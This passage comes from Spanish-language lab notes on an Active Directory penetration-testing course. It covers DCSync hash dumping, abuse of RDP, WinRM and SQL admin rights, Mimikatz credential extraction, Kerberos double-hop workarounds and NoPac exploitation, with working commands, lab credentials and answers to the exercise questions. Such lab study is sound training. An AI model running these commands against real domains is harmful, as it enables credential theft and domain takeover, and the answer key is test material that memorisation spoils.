    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

<SNIP>
```

> En la siguiente sección veremos cómo enumerar y aprovechar posibles accesos remotos asignados a un usuario bajo nuestro control. Entre los métodos que exploraremos se incluyen el uso de Remote Desktop Protocol (RDP), WinRM (o PsRemoting) y acceso administrativo a servidores SQL.

##### _Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer._

> **Respuesta**: syncron

Accedemos por RDP a la primera máquina que nos dan:

```bash
rdesktop -u htb-student \                                                                                                       
         -p 'Academy_student_AD!' \
         -d INLANEFREIGHT.LOCAL \
         10.129.124.134
```

Una vez dentro, abrimos una sesión de PowerShell como administrador, vamos a `C:\Tools` e importamos el módulo de PowerView. Simplemente ejecutamos este comando:

```powershell
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

![[Pasted image 20250722105056.png]]

Y ahí lo tenemos. 

##### _What is this user's cleartext password?_

> **Respuesta**: Mycleart3xtP@ss!

Lo primero que tenemos que hacer aquí es conectarnos por SSH desde la sesión PowerShell abierta al siguiente equipo: `172.16.5.225` con las credenciales `htb-student:HTB_@cademy_stdnt!`

![[Pasted image 20250722105802.png]]

Ahora tendremos que usar `secretsdump.py` de la siguiente manera:

```powershell
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

Nos pedirá contraseña del usuario `adunn`, recordemos que la obtuvimos anteriormente y era `SyncMaster757`. Lo dejamos corriendo un rato porque hay setecientos usuarios, y al final, obtenemos en texto claro la contraseña de `syncron`:

![[Pasted image 20250722110138.png]]

##### _Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer._

> **Respuesta**: 4bb3b317845f0954200a6b0acc9b9f9a

En este caso usamos el mismo comando que antes, solo que esta vez añadimos el usuario al que queremos apuntar:

```
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
```

![[Pasted image 20250722110347.png]]

# Acceso privilegiado

Una vez obtenemos un primer acceso al dominio, el siguiente objetivo es escalar nuestra posición mediante movimiento lateral o vertical, ya sea para comprometer por completo el dominio o alcanzar algún objetivo concreto de la auditoría. Para ello, una opción común es comprometer una cuenta con privilegios de administrador local y usar Pass-the-Hash para autenticarnos por SMB.

Sin embargo, si aún no tenemos privilegios de administrador local en ningún host, existen otros métodos de movimiento lateral en entornos Windows:

- **RDP**, que permite acceso remoto con interfaz gráfica al host    
- **PowerShell Remoting (WinRM/PSRemoting)**, que nos da acceso remoto por consola para ejecutar comandos    
- **MSSQL**, donde una cuenta con permisos de `sysadmin` puede ejecutar comandos del sistema desde el contexto del servicio SQL Server    

Podemos enumerar este tipo de accesos de varias formas, siendo **BloodHound** una de las más visuales gracias a los edges como `CanRDP`, `CanPSRemote` y `SQLAdmin`. También pueden detectarse estos privilegios con herramientas como **PowerView** o incluso con utilidades integradas de Windows.

### Montando el escenario

En esta sección alternaremos entre un equipo atacante con Windows y otro con Linux para realizar los distintos ejemplos. Puedes conectarte por RDP al host Windows `MS01`, y para las partes que requieren herramientas desde Linux (como `mssqlclient.py` o `evil-winrm`), puedes abrir una consola PowerShell en `MS01` y conectarte por SSH al host Linux con las credenciales proporcionadas. Se recomienda probar todos los métodos mostrados: `Enter-PSSession` y `PowerUpSQL` desde Windows, y `evil-winrm` y `mssqlclient.py` desde Linux.

### Remote Desktop

Normalmente, si controlamos una cuenta con privilegios de administrador local en una máquina, podremos acceder a ella por RDP. Sin embargo, a veces conseguimos acceso inicial con un usuario que no es admin local, pero que sí tiene permiso para conectarse por RDP a una o varias máquinas. Este acceso puede ser muy útil, ya que nos permite lanzar nuevos ataques, escalar privilegios o extraer información sensible y credenciales del sistema. Podemos usar PowerView y su función `Get-NetLocalGroupMember` para enumerar los miembros del grupo **Remote Desktop Users** en un host determinado, como en este caso el MS01 del dominio objetivo.

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

En este caso, todos los usuarios del dominio tienen permisos RDP sobre el host, algo común en servidores RDS o máquinas usadas como jump hosts. Estos sistemas suelen estar muy expuestos y pueden contener datos sensibles, como credenciales, o permitirnos escalar privilegios localmente para tomar el control de una cuenta con más permisos. Por eso, una de las primeras cosas que conviene revisar tras importar datos en BloodHound es si el grupo **Domain Users** tiene permisos de administrador local o de ejecución remota (como RDP o WinRM) sobre algún host del dominio.

##### Verificación de los derechos de administración local y ejecución remota del grupo Domain Users con BloodHound

![[Pasted image 20250722123518.png]]

Si comprometemos una cuenta mediante técnicas como LLMNR/NBT-NS Response Spoofing o Kerberoasting, podemos buscar ese usuario en BloodHound y revisar, en la pestaña **Node Info**, los derechos de acceso remoto que tiene asignados, ya sea de forma directa o heredada a través de pertenencia a grupos, dentro del apartado **Execution Rights**.

##### Comprobando privilegios de acceso remoto usando BloodHound

![[Pasted image 20250722123546.png]]

También podemos ir a la pestaña **Analysis** en BloodHound y ejecutar las consultas predefinidas como **Find Workstations where Domain Users can RDP** o **Find Servers where Domain Users can RDP**. Aunque existen otros métodos para enumerar esta información, BloodHound destaca por permitir identificar rápidamente este tipo de accesos, lo cual es especialmente útil durante auditorías con tiempo limitado. Además, también resulta valioso para equipos defensivos, ya que les permite auditar de forma periódica los accesos remotos y detectar configuraciones incorrectas, como que todos los Domain Users tengan acceso no intencionado a un host. Para comprobar este acceso, podemos usar herramientas como `xfreerdp`, `Remmina`, `Pwnbox` o `mstsc.exe` si atacamos desde un entorno Windows.

### WinRM

Al igual que con RDP, es posible que un usuario o grupo tenga acceso a WinRM en uno o varios hosts. Aunque este acceso sea de bajo nivel, puede servirnos para buscar datos sensibles o escalar privilegios, y en algunos casos incluso obtener acceso como administrador local. Podemos utilizar de nuevo la función `Get-NetLocalGroupMember` de PowerView para enumerar los miembros del grupo **Remote Management Users**, que existe desde Windows 8/Server 2012 y permite acceso WinRM sin necesidad de ser admin local.

##### Enumerando el grupo de administración remota de usuarios (Remote Management Users Group)

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

También podemos usar esta `Custom query` en BloodHound para cazar usuarios con este tipo de acceso. Esto se puede realizar pegando la query en el apartado `Raw Query`:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250722123858.png]]

También podríamos añadir esta query personalizada a nuestra instalación de BloodHound, para que siempre la tengamos disponible:

![[Pasted image 20250722124000.png]]

También podemos usar el cmdlet [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) usando PowerShell desde un host Windows

```powershell-session
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

Desde un host Linux, podemos usar `evil-winrm`:

```shell
$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3
```

### SQL Server Admin

Es habitual encontrarse con servidores SQL en los entornos auditados, y no es raro que ciertas cuentas de usuario o servicio tengan privilegios de `sysadmin` sobre alguna instancia. Podemos obtener credenciales con este acceso mediante Kerberoasting, LLMNR/NBT-NS Response Spoofing, password spraying u otras técnicas. También es posible encontrarlas en archivos de configuración como `web.config` usando herramientas como **Snaffler**. Una vez más, **BloodHound** es muy útil para detectar este tipo de acceso, identificándolo a través del edge **SQLAdmin**, ya sea desde la pestaña **Node Info** de un usuario o mediante una consulta Cypher personalizada.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Aquí vemos un usuario, `damundsen`, que tiene privilegios `SQLAdmin` sobre el host `ACADEMY-EA-DB01`

![[Pasted image 20250722124422.png]]

Podemos aprovechar nuestros permisos ACL para autenticarnos como el usuario `wley`, cambiar la contraseña de `damundsen` y luego acceder al servidor SQL con herramientas como **PowerUpSQL**. Por ejemplo, si cambiamos la contraseña a `SQL1234!`, podremos autenticarnos y ejecutar comandos en el sistema. El primer paso será buscar instancias de SQL Server activas.

##### Enumerando instancias MSSQL con PowerUpSQL

```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

A partir de ahí, podemos autenticarnos en el servidor SQL remoto y ejecutar consultas personalizadas o comandos del sistema operativo. Aunque vale la pena probar la herramienta, la enumeración y explotación avanzada de MSSQL queda fuera del alcance de este módulo.

```powershell-session
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

También podemos autenticarnos desde nuestro Linux atacante con `impacket-mssqlclient`

```shell
$ impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
..SNIP...
```

Una vez conectados, podríamos habilitar `xp_cmdshell` mediante la opción `enable_xp_cmdshell`, lo que permite ejecutar comandos del sistema operativo desde la base de datos, siempre que la cuenta tenga los permisos necesarios.

```shell-session
SQL> enable_xp_cmdshell
```

Por último, podemos ejecutar comandos usando `xp_cmdshell <comando>`. Así podemos enumerar los privilegios del usuario y, si detectamos `SeImpersonatePrivilege`, podríamos escalar a SYSTEM usando herramientas como **JuicyPotato**, **PrintSpoofer** o **RoguePotato**, según el sistema objetivo. Estas técnicas se explican en el módulo de escalada de privilegios de Windows y pueden practicarse en este entorno si se desea profundizar.

##### Enumerando nuestros privilegios en el sistema con `xp_cmdshell`

```shell-session
xp_cmdshell whoami /priv
output    
```

Ahora pasemos a las preguntas:

##### _What other user in the domain has CanPSRemote rights to a host?_

> **Respuesta**: bdavis

Lo primero es recolectar el zip de información con SharpHound:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Cuando haya terminado, importamos el ZIP en BloodHound GUI y ejecutamos la custom query:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250722125928.png]]

##### _What host can this user access via WinRM? (just the computer name)_

> **Respuesta**: ACADEMY-EA-DC01

Lo pone en la misma captura de arriba

##### _Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt._

_Es necesario autenticarse a **ACADEMY-EA-DB01** con `damundsen:SQL1234!`_

> **Respuesta**: 1m_the_sQl_@dm1n_n0w!

Al igual que antes, primero tenemos que conectarnos por SSH a `172.16.5.225` con las credenciales de `htb-student`:

```
PS C:\Tools> ssh htb-student@172.16.5.225
htb-student@172.16.5.225's password: HTB_@cademy_stdnt!
```

Ahora, usamos impacket o directamente el script python de `mssqlclient.py` para realizar lo siguiente:

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Nos pedirá la contraseña de este usuario, que es `SQL1234!`. Entramos:

![[Pasted image 20250722133915.png]]

Y ahora aquí, ejecutamos los siguientes pasos. Primero, tenemos que habilitar `xp_cmdshell`:

```SQL
SQL> enable_xp_cmdshell
```

Y para obtener la flag:

```
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```

![[Pasted image 20250722134142.png]]

# Kerberos Double Hop

El problema conocido como **“Double Hop”** ocurre cuando un atacante intenta usar autenticación Kerberos en más de un salto (por ejemplo, de una máquina a otra y luego a una tercera). Esto se debe a cómo Kerberos gestiona los tickets: no son contraseñas, sino datos firmados por el KDC que especifican qué recursos puede acceder una cuenta. Un ticket solo permite el acceso al recurso para el que fue emitido. En cambio, al autenticarse con contraseña (NTLM), el hash se guarda en la sesión y puede reutilizarse en otros sistemas sin problema, lo que no ocurre con Kerberos.
### Background

El problema del **Double Hop** aparece especialmente al usar WinRM o PowerShell remoto, ya que Kerberos solo entrega un ticket válido para el primer recurso, impidiendo movimientos laterales o acceso a recursos adicionales como comparticiones SMB. Aunque el usuario tenga permisos, se le deniega el acceso porque su contraseña o hash no se almacena en memoria. Esto no ocurre con autenticaciones por NTLM, como PSExec o ataques a servicios, donde el hash sí queda en memoria y puede reutilizarse. Con WinRM, al no usar contraseña directamente, no hay credenciales en la sesión. Si lo comprobamos con Mimikatz tras una conexión WinRM, veremos que los campos de credenciales están vacíos.

```powershell
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords
...SNIP...
mimikatz(commandline) # exit
Bye!
```

Efectivamente, hay procesos ejecutándose bajo el contexto del usuario `backupadm`, como `wsmprovhost.exe`, que es el proceso que se lanza al iniciar una sesión de PowerShell remoto mediante WinRM.

```powershell
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                             0:00:03 N/A
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
```

En resumen, en este tipo de situación, cuando intentamos ejecutar un comando que implica varios saltos entre servidores, nuestras credenciales **no se transfieren del primer al segundo equipo**.

Por ejemplo: tenemos tres equipos — _Attack host → DEV01 → DC01_. El equipo de ataque (una máquina Parrot) está en la red corporativa pero no unido al dominio. Obtenemos credenciales de un usuario del dominio que pertenece al grupo **Remote Management Users** en `DEV01`. Al conectarnos por WinRM a `DEV01`, queremos usar PowerView para enumerar el dominio, lo cual requiere contactar con el **controlador de dominio (DC01)**. Sin embargo, debido al problema del _Double Hop_, esa segunda conexión (de `DEV01` a `DC01`) fallará porque las credenciales no se reenvían automáticamente.

![[Pasted image 20250722145921.png]]

Cuando nos conectamos a un host como `DEV01` con herramientas como `evil-winrm`, usamos autenticación de red, lo que implica que las credenciales no se almacenan en memoria. Por tanto, no se pueden reutilizar para acceder a otros recursos. Al usar PowerView, por ejemplo, no podemos consultar el dominio porque **el TGT (Ticket Granting Ticket) no se transfiere en la sesión remota**, y sin él no es posible demostrar nuestra identidad ante el DC. Solo se envía el TGS (para ejecutar comandos en `DEV01`), pero no el TGT necesario para saltar a otros recursos.

Sin embargo, si el servidor tiene **delegación no restringida (unconstrained delegation)** habilitada, el TGT sí se transfiere. En ese caso, el host puede usar ese ticket para autenticarse en nombre del usuario a otros sistemas. En resumen: si aterrizas en una máquina con delegación no restringida, no tendrás este problema — y probablemente ya tienes la partida ganada.

### Soluciones al problema del Double Hop

Existen algunos métodos para evitar el problema del _Double Hop_. Uno consiste en usar `Invoke-Command` de forma anidada y enviar explícitamente las credenciales en cada salto mediante un objeto `PSCredential`. Esto permite, por ejemplo, autenticarse desde el host de ataque hacia un primer equipo y ejecutar comandos en un segundo. En esta sección se explicarán dos enfoques: uno aplicable desde una sesión `evil-winrm`, y otro si tenemos acceso gráfico (GUI) a un equipo Windows, ya sea propio o comprometido.

##### Solución #1: Objeto `PSCredential`

Una forma de sortear el _Double Hop_ es creando un objeto `PSCredential` para reenviar nuestras credenciales al ejecutar comandos remotos. Tras conectarnos a un host con credenciales de dominio, podemos importar PowerView, pero al intentar consultar información (como cuentas con SPN), fallará porque no podemos reenviar la autenticación al controlador de dominio. Este error ocurre porque el TGT no está disponible en la sesión remota.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

Si usamos el comando `klist`, veremos que solo tenemos un ticket Kerberos en caché para el servidor al que estamos conectados, lo que confirma que no se ha transferido el TGT y, por tanto, no podemos autenticarnos contra otros recursos del dominio desde esa sesión.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

Así que ahora establezcamos un objeto PSCredential y lo intentamos de nuevo. Primero, establecemos nuestra autenticación:

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Ahora, al ejecutar la consulta de cuentas con SPN usando PowerView y pasando nuestras credenciales mediante un objeto `PSCredential`, la operación tiene éxito, ya que esta vez se incluye la autenticación necesaria con el comando.

```shell
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Si probamos de nuevo win especificar la flag `-credential`, obtenemos nuevamente un error

```shell
get-domainuser -spn | select 

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

Si accedemos al mismo host por RDP, abrimos una terminal y ejecutamos `klist`, veremos que tenemos en caché los tickets necesarios para comunicarnos con el controlador de dominio, sin sufrir el problema del _Double Hop_. Esto ocurre porque, al autenticarnos por RDP, la contraseña queda almacenada en memoria y puede ser enviada con cada petición que realizamos.

```cmd-session
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)
```

##### Solución #2: Registrar configuración PSSession

Ya hemos visto cómo evitar el problema del _Double Hop_ al usar `evil-winrm`. Pero si estamos en un host unido al dominio o trabajamos desde un equipo Windows atacante y usamos `Enter-PSSession` para conectarnos por WinRM, tenemos otra alternativa. En este caso, podemos modificar la configuración para interactuar directamente con el DC u otros recursos sin necesidad de crear un objeto `PSCredential` ni reenviar credenciales en cada comando, lo cual no siempre es viable con ciertas herramientas. El primer paso es establecer una sesión WinRM en el host remoto.

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

Si ejecutamos `klist`, veremos que el problema persiste: seguimos afectados por el _Double Hop_. Solo podemos interactuar con recursos locales de la sesión actual, pero no con el DC directamente usando PowerView. El ticket TGS presente permite el acceso al servicio HTTP del host remoto, lo cual es esperable, ya que WinRM utiliza SOAP sobre HTTP para comunicarse.

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:
```

También podemos interactuar directamente con el DC usando PowerView

```powershell-session
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException
```

Un truco útil en este caso es registrar una nueva configuración de sesión utilizando el cmdlet `Register-PSSessionConfiguration`. Esto nos permite modificar el comportamiento de las sesiones remotas, facilitando el acceso a otros recursos del dominio sin los límites impuestos por el problema del _Double Hop_.

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess
```

Una vez registrada la nueva configuración de sesión, debemos reiniciar el servicio WinRM con `Restart-Service WinRM`, lo que cerrará la sesión actual. Luego, iniciamos una nueva sesión usando la configuración registrada. Al hacerlo, el problema del _Double Hop_ desaparece: si ejecutamos `klist`, veremos que tenemos los tickets necesarios en caché para comunicarnos con el controlador de dominio. Esto funciona porque nuestra máquina local ahora actúa en nombre del host remoto, usando el contexto del usuario `backupadm`, y todas las peticiones se envían directamente al DC.

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

Ahora podemos usar herramientas como PowerView sin necesidad de crear un objeto `PSCredential`, ya que la sesión tiene los tickets necesarios para interactuar con el dominio directamente.

```powershell
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

> Este método **no funciona desde una sesión `evil-winrm`** ni desde PowerShell en Linux, ya que requiere consola elevada y acceso GUI para usar `Register-PSSessionConfiguration`. Sin embargo, **sí es efectivo desde un host Windows con acceso RDP**, ideal como _jump host_ para lanzar ataques adicionales en el entorno.

# Vulnerabilidades críticas

Muchas organizaciones tardan en aplicar parches, lo que nos permite aprovechar vulnerabilidades recientes para obtener acceso inicial o escalar privilegios. Las técnicas mostradas aquí (actuales en abril de 2022) son ejemplos avanzados pensados para practicar en laboratorio, no para uso directo en entornos reales si no se comprenden bien los riesgos. Aunque son menos destructivas que otras (como Zerologon), siempre hay que actuar con precaución, documentar todo y avisar al cliente. Se recomienda probar estas técnicas y seguir investigando, ya que en ciberseguridad es clave mantenerse actualizado.
### Montando el escenario

En esta sección se realizarán todos los ejemplos desde un host atacante Linux (ATTACK01, accesible por SSH). Para las partes que requieren herramientas de Windows como Rubeus o Mimikatz, puedes usar el host MS01 y aplicar el mismo ataque Pass-the-Ticket con el blob en base64 obtenido con `ntlmrelayx.py` y `petitpotam.py`.

#### NoPac (SamAccountName Spoofing)

**NoPac** es una técnica de escalada de privilegios dentro del dominio que aprovecha las vulnerabilidades **CVE-2021-42278** y **CVE-2021-42287**:

- `42278`: permite suplantar nombres de cuenta de equipo (SAMAccountName).    
- `42287`: afecta al certificado de atributos de privilegio Kerberos (PAC).    

**Funcionamiento:**  
Un usuario autenticado puede crear hasta 10 equipos en el dominio. Cambiando el nombre de uno de ellos para que coincida con el de un DC (`SAMAccountName`), y solicitando tickets Kerberos, el sistema nos otorga privilegios como si fuéramos el controlador de dominio. Esto permite incluso obtener una shell SYSTEM en el DC.

La herramienta para explotarlo se encuentra en `/opt/nopac` del host ATTACK01. Usa Impacket para comunicarse, subir payloads y ejecutar comandos desde el host atacante al DC. Antes de usarlo, asegúrate de tener Impacket instalado y haber clonado el repo del exploit. Una vez que tenemos **Impacket** instalado y el repositorio de **NoPac** clonado, podemos comprobar si el entorno es vulnerable con `scanner.py`, usando una cuenta estándar del dominio. Si se consigue obtener un **TGT**, el sistema es vulnerable. Después, con `noPac.py`, podemos explotar la vulnerabilidad y obtener una shell como **NT AUTHORITY\SYSTEM** en el DC.

Este ataque depende de que el atributo `ms-DS-MachineAccountQuota` esté en su valor por defecto (10). Si un administrador lo ha puesto a 0, no podremos crear cuentas de máquina y el ataque fallará.

```shell
amr251@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

Una forma común de aprovechar **NoPac** es obtener una shell como **NT AUTHORITY\SYSTEM**, suplantando al administrador del dominio. Para ello se ejecuta `noPac.py` indicando el usuario objetivo. Esto nos da acceso seminteractivo en el **Domain Controller**.

Sin embargo, este método puede ser **ruidoso** y detectado o bloqueado por **antivirus o EDR**. 

##### Ejecutand NoPac y obteniendo una shell

```shell-session
amr251@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

...SNIP...

